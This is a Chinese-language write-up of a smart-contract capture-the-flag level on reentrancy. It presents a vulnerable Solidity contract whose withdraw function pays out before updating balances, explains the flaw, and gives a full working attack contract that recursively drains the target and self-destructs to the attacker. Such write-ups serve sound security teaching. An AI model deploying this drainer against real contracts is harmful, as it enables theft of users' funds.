# Re-entrancy
Re-entrancy這一關要求我們將合約內的所有資產全部竊走，主要考察的還是fallback的相關知識，讓我們先看代碼。

## 合约代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
## 代碼分析
這是一個非常經典的重入攻擊的一關，首先找到可以用於提取Ether的代碼，其實就是在`withdraw`函數。我們來看一下`withdraw`函數的內部：
```
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```
可以看到，最開始有一個條件限制，當`msg.sender` map的`balances`值大於我們要提取的`_amount`時，合約會向`msg.sender`用`call`的方式轉移`_amount`數量的Ether。在`msg.sender`收到Ether之後，`msg.sender`的`balances`會減去提取的`_amount`數量。

這裡的問題在於我們可以`msg.sender`是先獲得了`_amount`數量的Ether,然後再從`balances`減去`_amount`的數量。我們可以利用fallback，在我們收到Ether之後，利用fallback函數再次調用`withdraw`函數，這樣就是一直`withdraw`直到`Reentrance`合約內部的Ether取完為止。

```
if(result) {
        _amount;
      }
```
這裡稍微提一下這一段，這一段的其實可以省略。存在的意義我猜是作者希望編譯器不發出警告，因為如果不寫這一小段的話，編譯器會警告我們沒有使用到`result`這個變量。


## 攻擊代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Attack {
    IReentrance private immutable target;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    // NOTE: attack cannot be called inside constructor
    function attack() external payable {
        target.donate{value: 100000000000000}(address(this));
        target.withdraw(100000000000000);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender)); //將攻擊合約內的餘額全部返還到攻擊者的地址
    }

    receive() external payable {
        uint256 amount = min(100000000000000, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}

```

## 攻擊過程
1. 部署攻擊合約, 部署的入參為目標合約的地址
2. 使用`attack`函數攻擊目標合約
3. 完成任務
